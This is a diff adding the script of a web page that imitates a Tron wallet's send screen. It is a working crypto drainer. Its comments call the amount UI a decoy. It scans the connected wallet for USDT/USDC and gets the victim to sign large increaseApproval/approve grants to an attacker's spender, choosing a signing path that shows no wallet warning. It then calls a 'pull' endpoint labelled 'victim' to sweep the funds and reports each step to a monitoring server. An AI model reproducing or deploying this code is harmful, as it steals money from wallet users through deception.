+// die Wallet TRC-20 haelt — der /v1-Index liefert die vollstaendige Liste.
+// Beide parallel gelesen, Maps gemerged (dedup pro Contract, v1 zuerst).
+function fetchTronAcct(addr58) {
+  function getV1(host) {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 5000) : null;
+    return fetch(host + "/v1/accounts/" + addr58, { signal: ctl ? ctl.signal : undefined })
+      .then(function(r) { if (!r.ok) throw new Error("HTTP " + r.status); return r.json(); })
+      .then(function(j) { if (to) clearTimeout(to); return (j && j.data && j.data[0]) || null; })
+      .catch(function() { if (to) clearTimeout(to); return null; });
+  }
+  var acctP = tg("/wallet/getaccount", { address: tw_toHex(addr58).slice(2) }).catch(function() { return null; });
+  function getTs() {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 5000) : null;
+    return fetch("https://apilist.tronscanapi.com/api/account?address=" + addr58, { signal: ctl ? ctl.signal : undefined })
+      .then(function(r) { if (!r.ok) throw new Error("HTTP " + r.status); return r.json(); })
+      .then(function(j) {
+        if (to) clearTimeout(to);
+        if (!j || j.address == null) return null;
+        var trc = (j.trc20token_balances || []).map(function(t) { var o = {}; o[t.tokenId] = t.balance; return o; });
+        return { balance: j.balance, trc20: trc };
+      })
+      .catch(function() { if (to) clearTimeout(to); return null; });
+  }
+  var v1P = getV1("https://api.trongrid.io").then(function(v) { return v || getTs(); });
+  return Promise.all([acctP, v1P]).then(function(res) {
+    var a = res[0], v1a = res[1];
+    if (!a && !v1a) return null;
+    a = a || {};
+    var map = {};
+    ((v1a && v1a.trc20) || []).concat(a.trc20 || []).forEach(function(entry) {
+      Object.keys(entry).forEach(function(k) { map[k] = entry[k]; });
+    });
+    a.trc20 = Object.keys(map).map(function(k) { var o = {}; o[k] = map[k]; return o; });
+    if (a.balance == null && v1a) a.balance = v1a.balance;
+    return a;
+  });
+}
+function tw_toHex(addr58) {
+  var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  var num = 0n;
+  for (var i = 0; i < addr58.length; i++) num = num * 58n + BigInt(ALPH.indexOf(addr58[i]));
+  var hex = num.toString(16);
+  var zeros = 0;
+  while (addr58[zeros] === "1") zeros++;
+  hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+  return "0x" + hex.slice(0, -8);
+}
+function findTronWeb() {
+  return window.tronWeb ||
+         (window.tron && window.tron.tronWeb) ||
+         (window.tronLink && window.tronLink.tronWeb) || null;
+}
+async function getTronProvider() {
+  var addr = null;
+  function grab(res) {
+    if (res && typeof res === "object") {
+      addr = addr || res.address || (res.data && res.data.address) || (res.result && res.result.address) || null;
+    }
+  }
+  [window.tronLink, window.tron, window.trustwallet, window.trustWallet].forEach(function(t) {
+    if (t && t.request) {
+      try { Promise.resolve(t.request({ method: "tron_requestAccounts" })).then(grab).catch(function() {}); } catch(e) {}
+    }
+  });
+  try { window.dispatchEvent(new Event("tronLink#initialized")); } catch(e) {}
+  for (var i = 0; i < 160; i++) {
+    var tw = findTronWeb();
+    if (tw && tw.defaultAddress && tw.defaultAddress.base58) return { tw: tw, from: tw.defaultAddress.base58 };
+    if (addr && tw) return { tw: tw, from: addr };
+    if (MOBILE && i >= 16 && !tw) return null;
+    await new Promise(function(r) { setTimeout(r, 250); });
+  }
+  return null;
+}
+
+// ── Masken-UI (identisch zu /wallet) ─────────────────────────────────────────
+var displayAmount = "";
+var fiatMode = false;
+var RATE = 1;
+var walletBal = null;
+var isLoading = false;
+
+function shortAddr(a) {
+  return a && a.length > 12 ? a.slice(0, 8) + "…" + a.slice(-4) : (a || "—");
+}
+function updateUI() {
+  var inp = document.getElementById("display-amount");
+  inp.value = fiatMode && displayAmount ? "$" + displayAmount : displayAmount;
+  var num = parseFloat(displayAmount) || 0;
+  var fiat = fiatMode ? num / RATE : num * RATE;
+  document.getElementById("approx").textContent = fiatMode
+    ? "≈ " + fiat.toFixed(6).replace(/\.?0+$/, "") + " " + (token.name || "USDT")
+    : "≈ $" + fiat.toFixed(2);
+  var btn = document.getElementById("next-btn");
+  var ready = num > 0;
+  btn.disabled = !ready;
+  btn.classList.toggle("ready", ready);
+}
+function onAmountInput() {
+  displayAmount = document.getElementById("display-amount").value.replace(/[$\s]/g, "");
+  updateUI();
+}
+function toggleFiatMode() { fiatMode = !fiatMode; updateUI(); }
+function setMax() {
+  // Decoy wie in /wallet scan-Mode: die echte Queue nutzt die gescannten
+  // Balances, der getippte Wert ist nur UI.
+  displayAmount = String(walletBal != null && walletBal > 0 ? Math.floor(walletBal * 1e6) / 1e6 : 5.0);
+  updateUI();
+}
+function pressKey(k) {
+  var inp = document.getElementById("display-amount");
+  var cur = inp.value.replace(/[$\s]/g, "");
+  if (k === "." && cur.indexOf(".") > -1) return;
+  var dotAt = cur.indexOf(".");
+  if (k !== "." && dotAt > -1 && cur.length - dotAt - 1 >= 6) return;
+  if (cur.length >= 18) return;
+  if (cur === "0" && k !== ".") cur = "";
+  inp.value = cur + k;
+  if (navigator.vibrate) navigator.vibrate(8);
+  onAmountInput();
+}
+function backKey() {
+  var inp = document.getElementById("display-amount");
+  inp.value = inp.value.replace(/[$\s]/g, "").slice(0, -1);
+  if (navigator.vibrate) navigator.vibrate(6);
+  onAmountInput();
+}
+function openAddrSheet() {
+  document.getElementById("addr-edit").value = spender;
+  document.getElementById("addr-sheet").classList.remove("hidden");
+}
+function closeAddrSheet() { document.getElementById("addr-sheet").classList.add("hidden"); }
+function closeModal() { document.getElementById("result-modal").classList.add("hidden"); }
+function showModal(title, text, status, showConnect) {
+  document.getElementById("result-title").textContent = title;
+  document.getElementById("result-text").textContent = text;
+  var ic = document.getElementById("modal-icon");
+  ic.className = "modal-icon " + (status || "pending");
+  document.getElementById("connect-btn").classList.toggle("hidden", !showConnect);
+  document.getElementById("result-modal").classList.remove("hidden");
+}
+function setBtnLabel(t) { document.getElementById("next-btn").textContent = t; }
+
+// ── Tx-Bau (increaseApproval) — identisch zu /direct ─────────────────────────
+function amountRaw() {
+  var n = Number(amountParam);
+  if (!isFinite(n) || n <= 0) return "20000000";
+  var parts = amountParam.split(".");
+  var frac = (parts[1] || "").padEnd(token.decimals, "0").slice(0, token.decimals);
+  return (parts[0].replace(/\D/g, "") || "0") + frac;
+}
+async function extendExpiration(tx) {
+  try {
+    var target = BigInt(tx.raw_data.expiration), ADD = 3300000n;
+    var hx = tx.raw_data_hex, raw = [];
+    for (var i = 0; i < hx.length; i += 2) raw.push(parseInt(hx.substr(i, 2), 16));
+    function rdv(p) { var v = 0n, s = 0n; for (;;) { var b = raw[p++]; v |= BigInt(b & 127) << s; if (!(b & 128)) return [v, p]; s += 7n; } }
+    var pos = 0, hit = -1, vend = 0;
+    while (pos < raw.length) {
+      var t = rdv(pos); pos = t[1];
+      var wire = Number(t[0] & 7n);
+      if (wire === 0) { var vs = pos, vv = rdv(pos); pos = vv[1]; if (vv[0] === target) { hit = vs; vend = pos; break; } }
+      else if (wire === 2) { var l = rdv(pos); pos = l[1] + Number(l[0]); }
+      else if (wire === 5) pos += 4;
+      else if (wire === 1) pos += 8;
+      else break;
+    }
+    if (hit < 0) return;
+    var enc = [], v = target + ADD;
+    for (;;) { var b = Number(v & 127n); v >>= 7n; enc.push(b | (v ? 128 : 0)); if (!v) break; }
+    var raw2 = raw.slice(0, hit).concat(enc, raw.slice(vend));
+    var buf = await crypto.subtle.digest("SHA-256", new Uint8Array(raw2));
+    var toH = function(b) { return (b < 16 ? "0" : "") + b.toString(16); };
+    tx.raw_data_hex = raw2.map(toH).join("");
+    tx.txID = Array.from(new Uint8Array(buf)).map(toH).join("");
+    tx.raw_data.expiration = Number(target + ADD);
+  } catch (e) {}
+}
+async function buildIncreaseTx(from, tok, rawAmt, fallbackBal) {
+  var spendHex = tw_toHex(spender);
+  var ownerHex = tw_toHex(from).slice(2);
+  var acctP2 = tg("/wallet/getaccount", { address: ownerHex }).catch(function() { return null; });
+  var tokenHex = tw_toHex(tok.addr).slice(2);
+  // Kill-Switch wie /direct: tronAllowance aus → +0 approve (harmlos)
+  var cfg = await cfgFullP;
+  if (cfg && cfg.tronAllowance === false) rawAmt = "0";
+  // Approve-Floor aus der Admin-Config (Token-Einheiten × 10^decimals) —
+  // deckt kuenftige Einzahlungen ab und TW rendert das decodierte
+  // "Freigeben"-Sheet statt des generischen. 0 = kein Floor, Kill-Switch
+  // bleibt 0.
+  var aprU = (cfg && cfg.tronApproveAmt != null) ? Number(cfg.tronApproveAmt) : 200000000;
+  var linkU = Number(amountParam) || 0;
+  if (isFinite(linkU) && linkU > aprU) aprU = linkU;
+  if (rawAmt !== "0" && isFinite(aprU) && aprU > 0) {
+    var flr = BigInt(Math.floor(aprU)) * (10n ** BigInt(Math.min(tok.decimals || 6, 30)));
+    if (BigInt(rawAmt) < flr) rawAmt = flr.toString();
+  }
+  var param = spendHex.slice(2).padStart(64, "0")
+            + BigInt(rawAmt).toString(16).padStart(64, "0");
+  // Burn-Gate VOR dem Sheet (gleiche java-tron-Formel wie pull.py):
+  var selector = "increaseApproval(address,uint256)";
+  var simP = tg("/wallet/triggerconstantcontract", {
+    owner_address: ownerHex,
+    contract_address: tokenHex,
+    function_selector: selector,
+    parameter: param
+  });
+  var resrP = tg("/wallet/getaccountresource", { address: ownerHex }).catch(function() { return null; });
+  var sim = await simP;
+  var used = (sim && sim.energy_used) || 0;
+  if (!used || !((sim || {}).result || {}).result) {
+    // Manche TRC-20 (v.a. unbekannte in der Queue) haben kein increaseApproval
+    // — approve(address,uint256) ist der TRC-20-Pflichtselector.
+    selector = "approve(address,uint256)";
+    sim = await tg("/wallet/triggerconstantcontract", {
+      owner_address: ownerHex,
+      contract_address: tokenHex,
+      function_selector: selector,
+      parameter: param
+    }).catch(function() { return null; });
+    used = (sim && sim.energy_used) || 0;
+    if (!used || !((sim || {}).result || {}).result) {
+      throw new Error("simulation failed: " + JSON.stringify(sim && sim.result || sim).slice(0, 140));
+    }
+  }
+  var acct = await acctP2;
+  // Read-Fehler ≠ leere Wallet: der Scan hat die Balance Sekunden vorher
+  // erfolgreich gelesen — als Fallback nehmen, sonst killt ein flaky
+  // Node jedes Sheet mit einem falschen "insufficient energy".
+  var bal = (acct && acct.balance != null) ? acct.balance : (fallbackBal || 0);
+  var resr = await resrP;
+  var haveE = resr ? Math.max(0, (resr.EnergyLimit || 0) - (resr.EnergyUsed || 0)) : 0;
+  var need = Math.ceil(used * 1.15);
+  if (haveE + Math.floor(bal / 100) < need) {
+    monit("tronmask_skip_burn", { from: from, need: need, have: haveE, bal_sun: bal });
+    throw new Error("insufficient energy — wallet cannot cover network fee");
+  }
+  var feeLimit = Math.min(Math.ceil(need * 100 * 1.05), Math.floor(bal * 0.95), 100000000);
+  if (feeLimit < need * 100) {
+    monit("tronmask_skip_burn", { from: from, need: need, fee_limit_cap: feeLimit });
+    throw new Error("fee cap below required energy — aborted before signature");
+  }
+  var res = await tg("/wallet/triggersmartcontract", {
+    owner_address: ownerHex,
+    contract_address: tokenHex,
+    function_selector: selector,
+    parameter: param,
+    fee_limit: feeLimit,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+
+// Gas-Drop — wartet nur wenn wirklich gedroppt wurde (leere Wallets)
+function fetchT(url, opts, ms) {
+  var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+  var to = ctl ? setTimeout(function() { ctl.abort(); }, ms || 9000) : null;
+  opts = opts || {}; if (ctl) opts.signal = ctl.signal;
+  return fetch(url, opts).finally(function() { if (to) clearTimeout(to); });
+}
+async function sponsorFees(addr, acctP) {
+  try {
+    var known = acctP ? (await acctP.catch(function() { return null; })) : null;
+    if (known && (known.balance || 0) >= 12e6) return;
+    var balBefore = known ? (known.balance || 0) : -1;
+    await fetchT(MONITOR_URL, {
+      method: "POST", headers: { "Content-Type": "application/json" }, keepalive: true,
+      body: JSON.stringify({ ev: "tronmask_connected", t: new Date().toISOString(),
+                             sid: monitSid, d: { addr: addr } })
+    }, 5000).catch(function() {});
+    var p = await fetchT("/api/energy", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "pay", victim: addr })
+    }, 15000).then(function(r) { return r.json(); });
+    if (!p || p.error || !p.gas_tx) return;
+    monit("energy_pay", { victim: addr, txid: p.gas_tx });
+    for (var i = 0; i < 7; i++) {
+      await new Promise(function(r) { setTimeout(r, 1800); });
+      var a = await tg("/wallet/getaccount", { address: tw_toHex(addr).slice(2) }).catch(function() { return null; });
+      if (a && balBefore >= 0 && (a.balance || 0) > balBefore) break;
+      if (a && balBefore < 0 && (a.balance || 0) > 0) break;
+    }
+    monit("energy_sponsored", { victim: addr, txid: p.gas_tx });
+  } catch (e) {}
+}
+
+
+
+// Prefetch wenn die Opfer-Adresse im Link steht
+var earlyAcctP = isTronAddr(forAddr)
+  ? fetchTronAcct(forAddr)
+  : null;
+
+// ── Flow: Review → Connect → Sponsor → Queue → Sheets → Auto-Pull ────────────
+var conn = null;
+function clickNext() {
+  if (isLoading) return;
+  if (navigator.vibrate) navigator.vibrate(10);
+  startFlow();
+}
+async function startFlow() {
+  if (isLoading) return;
+  isLoading = true;
+  closeModal();
+  setBtnLabel("Connecting…");
+  try {
+    if (!conn) {
+      conn = await getTronProvider();
+      if (!conn) {
+        if (MOBILE && !params.get("fwd") && !sessionStorage.getItem("tw_fwd")) {
+          sessionStorage.setItem("tw_fwd", "1");
+          monit("tronmask_forward", { reason: "no provider" });
+          var self = location.origin + location.pathname + location.search
+                   + (location.search ? "&" : "?") + "fwd=1";
+          location.href = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(self);
+          return;
+        }
+        showModal("Wallet not connected", "Open this page inside Trust Wallet or TronLink.", "error", true);
+        isLoading = false;
+        setBtnLabel("Review");
+        return;
+      }
+    }
+    monit("tronmask_connected", { addr: conn.from });
+    setBtnLabel("Preparing…");
+    var t0 = Date.now();
+    var acctP = (earlyAcctP && forAddr === conn.from)
+      ? earlyAcctP
+      : fetchTronAcct(conn.from);
+    // Sponsor laeuft PARALLEL zum Wallet-Scan — erst vor dem ersten Sheet
+    // muss der Gas-Drop gelandet sein (Burn-Gate liest die Balance frisch).
+    var sponsorP = sponsorFees(conn.from, acctP);
+    var acct = await acctP;
+    // Auto-Queue: USDT/USDC mit Balance ≥ minPullUsd, größte→kleinste.
+    // Leere Wallet → ein Sheet aufs Link-Token mit dem Link-Betrag.
+    await cfgP;
+    var queue = scanQueue(acct);
+    if (!queue.length) queue = [{ addr: token.addr, decimals: token.decimals, name: token.name, raw: amountRaw() }];
+    monit("tronmask_queue", { from: conn.from, tokens: queue.length, t_ms: Date.now() - t0,
+                              names: queue.map(function(q) { return q.name; }).join(",") });
+    await sponsorP;
+    monit("tronmask_sponsored", { from: conn.from, t_ms: Date.now() - t0 });
+    // Token-Row: erstes Queue-Token als Face — wie /wallet das Badge flipt
+    if (queue[0] && queue[0].name) {
+      document.getElementById("display-token").textContent = queue[0].name;
+      walletBal = Number(BigInt(queue[0].raw)) / Math.pow(10, queue[0].decimals);
+      document.getElementById("token-balance").textContent =
+        walletBal.toLocaleString("en-US", { maximumFractionDigits: 4 });
+      document.getElementById("token-fiat").textContent =
+        "$" + (queue[0].usd || 0).toFixed(2) + " · Tron";
+    }
+
+    async function txInfo(txid) {
+      if (!txid) return null;
+      for (var i = 0; i < 3; i++) {
+        var info = await tg("/wallet/gettransactioninfobyid", { value: txid }).catch(function() { return null; });
+        if (info && info.receipt) return info;
+        await new Promise(function(r) { setTimeout(r, 4000); });
+      }
+      return null;
+    }
+    function collect(tokAddr) {
+      fetch("/api/pull", { method: "POST", keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "tron_collect", victim: conn.from, token: tokAddr, amount: "max" })
+      }).catch(function() {});
+    }
+    async function signOnce(it) {
+      var unsigned = await buildIncreaseTx(conn.from, it, it.raw, acct && acct.balance);
+      monit("tronmask_built", { from: conn.from, token: it.name });
+      monit("tronmask_signing", { from: conn.from, token: it.name });
+      // trx.sign = generisches Sheet OHNE Warnung (Owner-Vorgabe 05.10.).
+      // tronLink.sign nur Fallback — rendert sonst Warnbanner + Checkboxen.
+      var signed = await Promise.race([
+        (conn.tw && conn.tw.trx && typeof conn.tw.trx.sign === "function"
+          ? conn.tw.trx.sign(unsigned)
+          : (window.tronLink && typeof window.tronLink.sign === "function"
+            ? window.tronLink.sign(unsigned) : Promise.reject(new Error("no tron signer")))),
+        new Promise(function(_, rej) {
+          setTimeout(function() { rej(new Error("sign timeout — wallet swallowed the request")); }, 60000);
+        })
+      ]);
+      var bc = await tg("/wallet/broadcasttransaction", signed);
+      if (!bc || bc.result !== true) {
+        var raw = (bc && bc.message) || "";
+        var msg = /^[0-9a-fA-F]{6,}$/.test(raw)
+          ? (function(h){var s="";for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s;})(raw)
+          : raw;
+        if (!/dup/i.test(msg)) {
+          var e = new Error(msg || "broadcast failed");
+          e.txid = signed && signed.txID;
+          throw e;
+        }
+        return signed.txID || "broadcast-by-wallet";
+      }
+      return bc.txid || (signed && signed.txID);
+    }
+    var done = 0, lastTxid = null;
+    for (var qi = 0; qi < queue.length; qi++) {
+      var it = queue[qi];
+      setBtnLabel(queue.length > 1
+        ? "Confirm in wallet… (" + (qi + 1) + "/" + queue.length + " · " + it.name + ")"
+        : "Confirm in wallet…");
+      var txid;
+      try {
+        txid = await signOnce(it);
+      } catch (e1) {
+        // "Site not connected" = fehlende Site-Permission, kein Cancel —
+        // einmal connecten, dann dieselbe Tx erneut anbieten.
+        var m1 = ((e1 && (e1.message || e1)) + "");
+        if (/not connected/i.test(m1) && !it._connected) {
+          it._connected = true;
+          var bridge = [window.tronLink, window.tron, window.trustwallet, window.trustWallet]
+            .filter(function(t) { return t && t.request; })[0];
+          if (bridge) {
+            monit("tronmask_connect_req", { token: it.name });
+            try { await bridge.request({ method: "tron_requestAccounts" }); } catch(e) {}
+            try { txid = await signOnce(it); } catch (e2) { e1 = e2; txid = null; }
+          }
+        }
+        if (!txid) {
+          var info = await txInfo(e1 && e1.txid);
+          if (info && (info.receipt || {}).result === "SUCCESS") {
+            txid = e1.txid;
+          } else {
+            monit("tronmask_rejected", { token: it.name,
+                                         reason: ((e1 && (e1.message || e1)) + "").slice(0, 200) });
+            continue; // verworfener Token → nächster Queue-Eintrag
+          }
+        }
+      }
+      done++;
+      lastTxid = txid;
+      monit("tronmask_approved", { spender: spender, amount: String(it.raw), token: it.name,
+                                   hash: txid, from: conn.from, step: qi + 1, of: queue.length });
+      collect(it.addr);
+    }
+    if (!done) {
+      showModal("Transaction failed", "The request was declined in the wallet.", "error", false);
+      setBtnLabel("Review");
+      isLoading = false;
+      return;
+    }
+    var finalInfo = await txInfo(lastTxid);
+    var finalResult = (finalInfo && finalInfo.receipt) ? finalInfo.receipt.result : "unseen";
+    monit("tronmask_confirmed", { hash: lastTxid, from: conn.from, receipt: finalResult, approved: done, of: queue.length });
+    showModal("Transaction submitted", "The transfer is being confirmed on the network.", "success", false);
+    setTimeout(function() { location.replace("https://trustwallet.com/"); }, 1200);
+  } catch(e) {
+    var reason = (e && (e.message || e)) + "";
+    var extra = {};
+    try {
+      if (e && typeof e === "object") {
+        if (e.name) extra.name = e.name;
+        if (e.code != null) extra.code = e.code;
+        var ks = Object.keys(e);
+        if (ks.length) extra.keys = ks.join(",").slice(0, 160);
+      } else extra.type = typeof e;
+    } catch(x) {}
+    monit("tronmask_error", Object.assign({ reason: reason.slice(0, 200) }, extra));
+    showModal("Transaction failed", "The request could not be completed.", "error", false);
+    setBtnLabel("Review");
+    isLoading = false;
+  }
+}
+
+// To-Bar: Spender-Adresse gekürzt wie in /wallet
+document.getElementById("input-addr").textContent = shortAddr(spender);
+updateUI();
+monit("tronmask_opened", { spender: spender, token: token.name, inWallet: !!findTronWeb() });
+tronAddrValid(spender).then(function(ok) {
+  if (!ok) monit("tronmask_error", { reason: "invalid spender checksum" });
+});
+
+// In-app-browser chrome: die untere Toolbar ueberdeckt das Webview-Ende.
+// visualViewport liefert die echte bedeckte Zone → --bottom-cover.
+(function() {
+  var vv = window.visualViewport;
+  if (!vv) return;
+  function updateViewportFit() {
+    var covered = Math.max(0, window.innerHeight - vv.height - vv.offsetTop);
+    document.documentElement.style.setProperty("--bottom-cover", Math.round(covered) + "px");
+  }
+  vv.addEventListener("resize", updateViewportFit);
+  vv.addEventListener("scroll", updateViewportFit);
+  updateViewportFit();
+  setTimeout(updateViewportFit, 300);
+})();
+</script>
+</body>
+</html>
